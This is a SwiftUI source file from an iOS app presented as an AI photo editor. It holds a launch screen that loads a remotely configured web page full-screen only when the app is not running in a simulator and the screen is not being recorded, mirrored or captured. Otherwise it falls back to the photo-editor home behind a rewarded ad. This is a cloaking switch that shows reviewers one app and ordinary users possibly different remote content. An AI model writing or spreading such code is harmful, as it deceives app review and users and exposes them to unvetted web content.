//
//  PrimaryNavigationView.swift
//  Ai Photo Editor
//
//  Created by Mobi iOS on 13/02/26.
//


import Foundation
import SwiftUI
import WebKit
import AppTrackingTransparency
import FirebaseRemoteConfig
import UIKit

#if canImport(ReplayKit)
import ReplayKit
#endif
import FirebaseAnalytics

struct PrimaryNavigationView: View {
    
    @StateObject private var remoteConfigManager = RemoteConfigurationManager()
    @State private var hasNavigatedToMainView = false
    @State private var deviceMirroringDetected = false
    @State private var webViewLoaded = false

    var body: some View {
        ZStack {
            if !remoteConfigManager.configurationInProgress {
                if isApplicationRunningInSimulator() {
                    Color.clear
                        .onAppear {
                            if !hasNavigatedToMainView {
                                hasNavigatedToMainView = true
                                navigateToMainInterface()
                            }
                        }
                } else {
                    if isDeviceScreenBeingMirrored() {
                        Color.clear
                            .onAppear {
                                if !hasNavigatedToMainView {
                                    hasNavigatedToMainView = true
                                    navigateToMainInterface()
                                }
                            }
                    } else {
                        if let webDestination = remoteConfigManager.webDestinationURL, remoteConfigManager.webInterfaceEnabled == true {
                            WebContentLoader(
                                destinationURL: webDestination,
                                onLoadFailure: {
                                    DispatchQueue.main.async {
                                        navigateToMainInterface()
                                    }
                                },
                                onLoadSuccess: {
                                    DispatchQueue.main.async {
                                      webViewLoaded = true
                                    }
                                }
                            )
                        } else {
                            Color.clear
                                .onAppear {
                                    if !hasNavigatedToMainView {
                                        hasNavigatedToMainView = true
                                        navigateToMainInterface()
                                    }
                                }
                        }
                    }
                }
            }

            if remoteConfigManager.configurationInProgress || !webViewLoaded {
                ZStack {
                    Color.cyan.ignoresSafeArea()
                    Image(uiImage: UIImage(named: "SplashScreen")!)
                        .resizable()
                        .scaledToFill()
                        .frame(width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
                        .ignoresSafeArea()
                    
                    // Simple loading spinner
                    VStack(spacing: 16) {
                         ProgressView()
                            .progressViewStyle(CircularProgressViewStyle(tint: .white))
                            .scaleEffect(2.0) // Make it bigger
                     }
                    .frame(maxWidth: .infinity, maxHeight: .infinity)
                    .background(Color.black.opacity(0.3)) // Semi-transparent overlay
                }
                .onAppear {
                    if isApplicationRunningInSimulator() {
                        deviceMirroringDetected = true
                    } else {
                        deviceMirroringDetected = isDeviceScreenBeingMirrored()
                    }
                }
            }
        }
        .onAppear {
            Analytics.logEvent(AnalyticsEventAppOpen, parameters: nil)
        }
    }

    /// Checks if the app is running in a simulator
    private func isApplicationRunningInSimulator() -> Bool {
        #if targetEnvironment(simulator)
        return true
        #else
        return false
        #endif
    }

    /// Detects if the screen is being mirrored, recorded, or remotely accessed
    private func isDeviceScreenBeingMirrored() -> Bool {
        if #available(iOS 11.0, *) {
            if UIScreen.main.isCaptured {
                return true
            }
        }

        let availableScreens = UIScreen.screens
        if availableScreens.count > 1 {
            return true
        }

        if UIScreen.main.mirrored != nil {
            return true
        }

        if isDeviceUnderSupervision() {
            return true
        }

        if isScreenRecordingActive() {
            return true
        }

        return false
    }

    private func isDeviceUnderSupervision() -> Bool {
        #if !targetEnvironment(simulator)
        if #available(iOS 13.0, *) {
            return ProcessInfo.processInfo.environment["APP_SANDBOX_CONTAINER_ID"] != nil
        }
        #endif

        return false
    }

    private func isScreenRecordingActive() -> Bool {
        #if !targetEnvironment(simulator) && canImport(ReplayKit)
        if #available(iOS 11.0, *) {
            return RPScreenRecorder.shared().isRecording
        }
        #endif

        return false
    }

    private func navigateToMainInterface() {
        guard
            let currentScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
            let primaryWindow = currentScene.windows.first
        else { return }
        AdManager.showRewardedAd { success in
            // After ad completes (success or fail)
            DispatchQueue.main.async {
                
                let homeViewController = HomeView() // Replace with your actual home view
                primaryWindow.rootViewController = UIHostingController(rootView: homeViewController)
                primaryWindow.makeKeyAndVisible()
                requestUserTrackingPermission()
            }
        }
    }


    private func requestUserTrackingPermission() {
        DispatchQueue.main.async {
            if #available(iOS 14, *) {
                ATTrackingManager.requestTrackingAuthorization { authorizationStatus in
                    switch authorizationStatus {
                    case .notDetermined: print("Tracking: undecided.")
                    case .restricted: print("Tracking: restricted.")
                    case .denied: print("Tracking: denied.")
                    case .authorized: print("Tracking: granted.")
                    @unknown default: print("Tracking: unknown.")
                    }
                }
            }
        }
    }
}
